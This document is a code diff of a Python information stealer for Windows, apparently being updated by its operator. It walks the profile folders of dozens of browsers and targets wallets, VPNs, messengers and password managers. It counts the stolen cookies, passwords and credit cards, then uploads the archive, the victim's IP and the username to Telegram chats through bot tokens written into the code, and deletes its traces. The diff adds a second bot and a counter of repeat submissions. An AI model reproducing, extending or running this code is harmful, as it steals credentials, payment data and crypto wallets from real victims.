@@ -18,9 +18,10 @@ TMP = os.getenv("TEMP")
 USR = TMP.split("\\AppData")[0]
 Data_Path = f"{TMP}\\{os.getenv('COMPUTERNAME', 'defaultValue')}"
 
-TOKEN_BOT = "7595226455:AAH9cSe9U4XJZbvoNKQ1cDdaf6o1mphv_-I"
-CHAT_ID_NEW = "6307012750"
-CHAT_ID_RESET = "6307012750" 
+TOKEN_BOT_NEW = "7569877656:AAGoKi7ecTgs9mzehHzS1_ftQqDnYz2KefU" #Ads_Checker_New
+TOKEN_BOT_RESET = "7876706251:AAGxtlg0KTOAkEfYmfZ8MFNimRCsnkwXbwQ" #Ads_Checker_Reset
+CHAT_ID_NEW = "-1002347753105" #new
+CHAT_ID_RESET = "-1002253398590" #backup
 browsers = []
 
 process_names = [
@@ -43,43 +44,43 @@ creation_datetime = datetime.datetime.now().strftime('%d-%m-%Y (%H:%M:%S)')
 categories_order = ["Desktop Wallets", "Browser Wallets", "VPN Extensions", "Messengers", "VPN Clients", "Gaming", "Password Managers", "FTP Clients"]
 
 ch_dc_browsers = {
-	"Chromium": f"{LocalAppData}\\Chromium\\User Data",
-	"Thorium": f"{LocalAppData}\\Thorium\\User Data",
-	"Chrome": f"{LocalAppData}\\Google\\Chrome\\User Data",
-	"Chrome (x86)": f"{LocalAppData}\\Google(x86)\\Chrome\\User Data",
-	"Chrome SxS": f"{LocalAppData}\\Google\\Chrome SxS\\User Data",
-	"Maple": f"{LocalAppData}\\MapleStudio\\ChromePlus\\User Data",
-	"Iridium": f"{LocalAppData}\\Iridium\\User Data",
-	"7Star": f"{LocalAppData}\\7Star\\7Star\\User Data",
-	"CentBrowser": f"{LocalAppData}\\CentBrowser\\User Data",
-	"Chedot": f"{LocalAppData}\\Chedot\\User Data",
-	"Vivaldi": f"{LocalAppData}\\Vivaldi\\User Data",
-	"Kometa": f"{LocalAppData}\\Kometa\\User Data",
-	"Elements": f"{LocalAppData}\\Elements Browser\\User Data",
-	"Epic Privacy Browser": f"{LocalAppData}\\Epic Privacy Browser\\User Data",
-	"Uran": f"{LocalAppData}\\uCozMedia\\Uran\\User Data",
-	"Fenrir": f"{LocalAppData}\\Fenrir Inc\\Sleipnir5\\setting\\modules\\ChromiumViewer",
-	"Catalina": f"{LocalAppData}\\CatalinaGroup\\Citrio\\User Data",
-	"Coowon": f"{LocalAppData}\\Coowon\\Coowon\\User Data",
-	"Liebao": f"{LocalAppData}\\liebao\\User Data",
-	"QIP Surf": f"{LocalAppData}\\QIP Surf\\User Data",
-	"Orbitum": f"{LocalAppData}\\Orbitum\\User Data",
-	"Dragon": f"{LocalAppData}\\Comodo\\Dragon\\User Data",
-	"360Browser": f"{LocalAppData}\\360Browser\\Browser\\User Data",
-	"Maxthon": f"{LocalAppData}\\Maxthon3\\User Data",
-	"K-Melon": f"{LocalAppData}\\K-Melon\\User Data",
-	"CocCoc": f"{LocalAppData}\\CocCoc\\Browser\\User Data",
-	"Brave": f"{LocalAppData}\\BraveSoftware\\Brave-Browser\\User Data",
-	"Amigo": f"{LocalAppData}\\Amigo\\User Data",
-	"Torch": f"{LocalAppData}\\Torch\\User Data",
-	"Sputnik": f"{LocalAppData}\\Sputnik\\Sputnik\\User Data",
-	"Edge": f"{LocalAppData}\\Microsoft\\Edge\\User Data",
-	"DCBrowser": f"{LocalAppData}\\DCBrowser\\User Data",
-	"Yandex": f"{LocalAppData}\\Yandex\\YandexBrowser\\User Data",
-	"UR Browser": f"{LocalAppData}\\UR Browser\\User Data",
-	"Slimjet": f"{LocalAppData}\\Slimjet\\User Data",
-	"Opera": f"{AppData}\\Opera Software\\Opera Stable",
-	"OperaGX": f"{AppData}\\Opera Software\\Opera GX Stable",
+    "Chromium": f"{LocalAppData}\\Chromium\\User Data",
+    "Thorium": f"{LocalAppData}\\Thorium\\User Data",
+    "Chrome": f"{LocalAppData}\\Google\\Chrome\\User Data",
+    "Chrome (x86)": f"{LocalAppData}\\Google(x86)\\Chrome\\User Data",
+    "Chrome SxS": f"{LocalAppData}\\Google\\Chrome SxS\\User Data",
+    "Maple": f"{LocalAppData}\\MapleStudio\\ChromePlus\\User Data",
+    "Iridium": f"{LocalAppData}\\Iridium\\User Data",
+    "7Star": f"{LocalAppData}\\7Star\\7Star\\User Data",
+    "CentBrowser": f"{LocalAppData}\\CentBrowser\\User Data",
+    "Chedot": f"{LocalAppData}\\Chedot\\User Data",
+    "Vivaldi": f"{LocalAppData}\\Vivaldi\\User Data",
+    "Kometa": f"{LocalAppData}\\Kometa\\User Data",
+    "Elements": f"{LocalAppData}\\Elements Browser\\User Data",
+    "Epic Privacy Browser": f"{LocalAppData}\\Epic Privacy Browser\\User Data",
+    "Uran": f"{LocalAppData}\\uCozMedia\\Uran\\User Data",
+    "Fenrir": f"{LocalAppData}\\Fenrir Inc\\Sleipnir5\\setting\\modules\\ChromiumViewer",
+    "Catalina": f"{LocalAppData}\\CatalinaGroup\\Citrio\\User Data",
+    "Coowon": f"{LocalAppData}\\Coowon\\Coowon\\User Data",
+    "Liebao": f"{LocalAppData}\\liebao\\User Data",
+    "QIP Surf": f"{LocalAppData}\\QIP Surf\\User Data",
+    "Orbitum": f"{LocalAppData}\\Orbitum\\User Data",
+    "Dragon": f"{LocalAppData}\\Comodo\\Dragon\\User Data",
+    "360Browser": f"{LocalAppData}\\360Browser\\Browser\\User Data",
+    "Maxthon": f"{LocalAppData}\\Maxthon3\\User Data",
+    "K-Melon": f"{LocalAppData}\\K-Melon\\User Data",
+    "CocCoc": f"{LocalAppData}\\CocCoc\\Browser\\User Data",
+    "Brave": f"{LocalAppData}\\BraveSoftware\\Brave-Browser\\User Data",
+    "Amigo": f"{LocalAppData}\\Amigo\\User Data",
+    "Torch": f"{LocalAppData}\\Torch\\User Data",
+    "Sputnik": f"{LocalAppData}\\Sputnik\\Sputnik\\User Data",
+    "Edge": f"{LocalAppData}\\Microsoft\\Edge\\User Data",
+    "DCBrowser": f"{LocalAppData}\\DCBrowser\\User Data",
+    "Yandex": f"{LocalAppData}\\Yandex\\YandexBrowser\\User Data",
+    "UR Browser": f"{LocalAppData}\\UR Browser\\User Data",
+    "Slimjet": f"{LocalAppData}\\Slimjet\\User Data",
+    "Opera": f"{AppData}\\Opera Software\\Opera Stable",
+    "OperaGX": f"{AppData}\\Opera Software\\Opera GX Stable",
     "Speed360": f"{AppData}\\Local\\360chrome\\Chrome\\User Data",
     "QQBrowser": f"{AppData}\\Local\\Tencent\\QQBrowser\\User Data",
     "Sogou": f"{AppData}\\SogouExplorer\\Webkit",
@@ -1592,17 +1593,47 @@ if InfomationData == "":
 
 message_body = f"{GetIPD}\nUser: {os.getlogin()}\nBrowser Data: CK: {total_browsers_cookies_count}|PW: {total_browsers_logins_count}|CC: {total_browsers_ccards_count}\n"
 
-for i in range(10):
-    if Count == 1:
-        CHAT_ID = CHAT_ID_NEW #Sv Data Mới
-    else:
-        CHAT_ID = CHAT_ID_RESET #Sv Data Update (Send từ lần 2)
+def get_and_increment_sender_count():
+    conn = sqlite3.connect("sender_data.db")
+    cursor = conn.cursor()
 
+    # Tạo bảng nếu chưa có
+    cursor.execute("CREATE TABLE IF NOT EXISTS sender (count INTEGER)")
+    conn.commit()
+
+    # Lấy số lần gửi trước đó
+    cursor.execute("SELECT count FROM sender")
+    row = cursor.fetchone()
+
+    if row is None:
+        number_sender = 1  # Nếu chưa có, bắt đầu từ 1
+        cursor.execute("INSERT INTO sender (count) VALUES (?)", (number_sender,))
+    else:
+        number_sender = row[0] + 1  # Tăng lên 1
+        cursor.execute("UPDATE sender SET count = ?", (number_sender,))
+
+    conn.commit()
+    conn.close()
+
+    return number_sender
+
+number_sender = get_and_increment_sender_count()
+
+for i in range(10):
+    if Count == 1: #Sv Data 
+        CHAT_ID = CHAT_ID_NEW 
+        TOKEN = TOKEN_BOT_NEW
+        caption = message_body
+    else: #Sv Data Update
+        CHAT_ID = CHAT_ID_RESET 
+        TOKEN = TOKEN_BOT_RESET 
+        caption = f"{message_body} \n Number Of Times: {number_sender}"  # Hiển thị đúng số lần gửi
+    print(f"DEBUG: i = {i}, sender = {number_sender}, caption = {caption}")  # In để kiểm tra
     try:
         with open(archive_path, "rb") as f:
             response = requests.post(
-                f"https://api.telegram.org/bot{TOKEN_BOT}/sendDocument",
-                params={"chat_id": CHAT_ID, "caption": message_body, "protect_content": True, "disable_web_page_preview": True},
+                f"https://api.telegram.org/bot{TOKEN}/sendDocument",
+                params={"chat_id": CHAT_ID, "caption": caption, "protect_content": True, "disable_web_page_preview": True},
                 files={"document": f}
             )
             response.raise_for_status()
@@ -1613,4 +1644,3 @@ for i in range(10):
 shutil.rmtree(Data_Path, ignore_errors=True)
 if os.path.exists(archive_path):
     os.remove(archive_path)
-    
